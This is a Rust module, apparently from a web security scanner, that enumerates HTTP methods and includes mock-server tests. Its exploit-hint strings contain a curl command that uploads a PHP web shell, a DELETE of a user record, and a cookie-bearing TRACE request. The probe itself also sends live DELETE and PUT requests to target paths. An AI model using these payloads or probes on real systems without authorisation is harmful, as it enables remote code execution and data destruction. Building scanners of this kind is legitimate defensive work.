//! HTTP method enumeration probe.
//!
//! Sends OPTIONS to discover allowed methods, then actively verifies
//! dangerous ones (PUT, DELETE, PATCH, TRACE) on common paths.
//!
//! Findings:
//!   PUT enabled   → potential arbitrary file write / RCE
//!   DELETE enabled → data destruction without auth
//!   TRACE enabled  → cross-site tracing (XST), credential theft via XSS
//!   PATCH enabled  → partial update bypass (check auth separately)

use gossan_core::Target;
use reqwest::Client;
use secfinding::{Evidence, Finding, Severity};

// Paths to probe, mix of root, API, upload, and static paths
const PROBE_PATHS: &[&str] = &[
    "/",
    "/api",
    "/api/v1",
    "/upload",
    "/files",
    "/data",
    "/api/v1/users",
    "/api/v1/files",
    "/admin",
];

/// Returns true when a DELETE response status actually proves the method is
/// accepted by the server. 404 is deliberately excluded: most servers return
/// 404 for any non-existent resource regardless of method.
fn delete_status_indicates_enabled(status: u16) -> bool {
    matches!(status, 200 | 202 | 204)
}

pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Finding>> {
    let Target::Web(asset) = target else {
        return Ok(vec![]);
    };
    let base = asset.url.as_str().trim_end_matches('/');
    let mut findings = Vec::new();

    // Track which dangerous methods we've already reported (avoid spam)
    let mut reported_put = false;
    let mut reported_delete = false;
    let mut reported_trace = false;

    for path in PROBE_PATHS {
        let url = format!("{}{}", base, path);

        // OPTIONS request, server declares what it allows.
        // Non-UTF8 Allow headers must not suppress active probes.
        let mut header_parse_failed = false;
        let options_allow =
            if let Ok(resp) = client.request(reqwest::Method::OPTIONS, &url).send().await {
                match resp
                    .headers()
                    .get("allow")
                    .or_else(|| resp.headers().get("access-control-allow-methods"))
                {
                    Some(v) => match v.to_str() {
                        Ok(s) => s.to_uppercase(),
                        Err(e) => {
                            header_parse_failed = true;
                            tracing::warn!(
                                "OPTIONS Allow/Access-Control-Allow-Methods not valid UTF-8 at {}: {}; probing dangerous methods anyway",
                                url, e
                            );
                            String::new()
                        }
                    },
                    None => String::new(),
                }
            } else {
                tracing::warn!(
                    "OPTIONS probe send failed at {}; probing dangerous methods anyway",
                    url
                );
                String::new()
            };

        // ── TRACE ──────────────────────────────────────────────────────────
        if !reported_trace && (options_allow.contains("TRACE") || header_parse_failed || *path == "/") {
            match client
                .request(reqwest::Method::TRACE, &url)
                .header("X-Gossan-Probe", "xst-test")
                .send()
                .await
            {
                Err(e) => {
                    tracing::warn!(url = %url, error = %e, "TRACE probe send failed");
                }
                Ok(resp) => {
                let status = resp.status().as_u16();
                let body = gossan_core::net::bounded_text(resp, crate::MAX_BODY_BYTES)
                    .await?;
                // TRACE echoes the request back, look for our marker or TRACE keyword
                if (200..=299).contains(&status)
                    && (body.contains("X-Gossan-Probe") || body.to_uppercase().contains("TRACE"))
                {
                    reported_trace = true;
                    gossan_core::try_push_finding(
                        crate::misconfig_finding(
                            target,
                            Severity::Low,
                            "HTTP TRACE method enabled, cross-site tracing (XST)",
                            format!(
                                "{} responds to TRACE with HTTP {}. \
                                     TRACE echoes all request headers including cookies and \
                                     Authorization. Combined with XSS, an attacker can read \
                                     HttpOnly cookies (XST attack). Disable TRACE on the server.",
                                url, status
                            ),
                        )
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![("allow".into(), options_allow.clone().into())],
                            body_excerpt: Some(body.chars().take(crate::MAX_BODY_EXCERPT_CHARS).collect::<String>().into()),
                        })
                        .tag("http-method")
                        .tag("xst")
                        .tag("web")
                        .exploit_hint(format!(
                            "curl -s -X TRACE '{}' -H 'Cookie: session=victim_token'",
                            url
                        )),
                        &mut findings,
                    );
                }
            
                }
            }
        }

        // ── PUT ────────────────────────────────────────────────────────────
        if !reported_put && (options_allow.contains("PUT") || header_parse_failed) {
            // Try to PUT a harmless probe file
            let put_url = format!(
                "{}{}/gossan-method-probe.txt",
                base,
                path.trim_end_matches('/')
            );
            match client
                .request(reqwest::Method::PUT, &put_url)
                .header("content-type", "text/plain")
                .body("gossan-method-probe")
                .send()
                .await
            {
                Err(e) => {
                    tracing::warn!(url = %put_url, error = %e, "PUT probe send failed");
                }
                Ok(resp) => {
                let status = resp.status().as_u16();
                if matches!(status, 200 | 201 | 204) {
                    reported_put = true;
                    gossan_core::try_push_finding(crate::misconfig_finding(target, Severity::Critical,
                            format!("HTTP PUT enabled, arbitrary file write at {}", path),
                            format!("{} accepted an HTTP PUT request (HTTP {}). \
                                     An attacker can upload arbitrary files, including web shells. \
                                     to the server, potentially achieving Remote Code Execution.", put_url, status))
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![("allow".into(), options_allow.clone().into())],
                            body_excerpt: None,
                        })
                        .tag("http-method").tag("file-upload").tag("rce")
                        .exploit_hint(format!(
                            "# Upload a web shell:\ncurl -s -X PUT '{}webshell.php' \\\n  \
                             -H 'Content-Type: application/x-httpd-php' \\\n  \
                             -d '<?php system($_GET[\"cmd\"]); ?>'", &put_url.trim_end_matches("gossan-method-probe.txt"))), &mut findings);
                }
            
                }
            }
        }

        // ── DELETE ─────────────────────────────────────────────────────────
        if !reported_delete && (options_allow.contains("DELETE") || header_parse_failed) {
            let del_url = format!("{}{}", base, path);
            match client
                .request(reqwest::Method::DELETE, &del_url)
                .send()
                .await
            {
                Err(e) => {
                    tracing::warn!(url = %del_url, error = %e, "DELETE probe send failed");
                }
                Ok(resp) => {
                let status = resp.status().as_u16();
                // 200/202/204 = DELETE accepted; 405/501 = not really enabled despite OPTIONS claim
                if delete_status_indicates_enabled(status) {
                    reported_delete = true;
                    gossan_core::try_push_finding(crate::misconfig_finding(target, Severity::High,
                            format!("HTTP DELETE method accepted at {}", path),
                            format!("{} accepted HTTP DELETE (HTTP {}). \
                                     Unauthenticated DELETE on API endpoints allows data destruction. \
                                     bulk record removal, account deletion, or cascading data loss.", del_url, status))
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![("allow".into(), options_allow.clone().into())],
                            body_excerpt: None,
                        })
                        .tag("http-method").tag("data-destruction").tag("web")
                        .exploit_hint(format!("curl -s -X DELETE '{}/api/v1/users/1'", base)), &mut findings);
                }
            
                }
            }
        }

        if reported_put && reported_delete && reported_trace {
            break;
        }
    }

    Ok(findings)
}

#[cfg(test)]
mod tests {
    use super::*;
    use gossan_core::testkit::web_target;
    use reqwest::Client;
    use wiremock::{matchers::{method, path}, Mock, MockServer, ResponseTemplate};

    #[test]
    fn probe_paths_include_root() {
        assert!(PROBE_PATHS.contains(&"/"));
    }

    #[test]
    fn probe_paths_include_upload() {
        assert!(PROBE_PATHS.contains(&"/upload"));
    }

    #[test]
    fn probe_paths_include_admin() {
        assert!(PROBE_PATHS.contains(&"/admin"));
    }

    #[test]
    fn probe_paths_count_is_reasonable() {
        assert!(
            PROBE_PATHS.len() >= 5,
            "expected >=5 probe paths, got {}",
            PROBE_PATHS.len()
        );
    }

    #[test]
    fn probe_paths_include_api_v1_users() {
        assert!(PROBE_PATHS.contains(&"/api/v1/users"));
    }

    #[test]
    fn delete_404_is_not_proof_of_enabled_method() {
        // Old behaviour accepted 404 as proof of DELETE support; that must not
        // come back.
        assert!(!delete_status_indicates_enabled(404));
    }

    #[test]
    fn delete_only_200_202_204_count_as_accepted() {
        assert!(delete_status_indicates_enabled(200));
        assert!(delete_status_indicates_enabled(202));
        assert!(delete_status_indicates_enabled(204));
        assert!(!delete_status_indicates_enabled(405));
        assert!(!delete_status_indicates_enabled(501));
        assert!(!delete_status_indicates_enabled(500));
    }

    #[tokio::test]
    async fn delete_404_on_allowed_path_stays_silent() {
        let server = MockServer::start().await;
        Mock::given(method("OPTIONS"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(204)
                    .insert_header("allow", "GET, POST, DELETE, OPTIONS"),
            )
            .mount(&server)
            .await;
        Mock::given(method("DELETE"))
            .and(path("/"))
            .respond_with(ResponseTemplate::new(404))
            .mount(&server)
            .await;

        let client = Client::new();
        let target = web_target(&format!("{}/", server.uri()));
        let findings = crate::methods::probe(&client, &target).await.unwrap();

        assert!(
            findings.iter().all(|f| !f.title().to_lowercase().contains("delete")),
            "404 DELETE must not produce a DELETE-method finding"
        );
    }

    #[tokio::test]
    async fn delete_202_on_allowed_path_fires_finding() {
        let server = MockServer::start().await;
        Mock::given(method("OPTIONS"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(204)
                    .insert_header("allow", "GET, POST, DELETE, OPTIONS"),
            )
            .mount(&server)
            .await;
        Mock::given(method("DELETE"))
            .and(path("/"))
            .respond_with(ResponseTemplate::new(202))
            .mount(&server)
            .await;

        let client = Client::new();
        let target = web_target(&format!("{}/", server.uri()));
        let findings = crate::methods::probe(&client, &target).await.unwrap();

        assert!(
            findings.iter().any(|f| f.title().to_lowercase().contains("delete")),
            "HTTP 202 DELETE should be reported as accepted method"
        );
    }
}
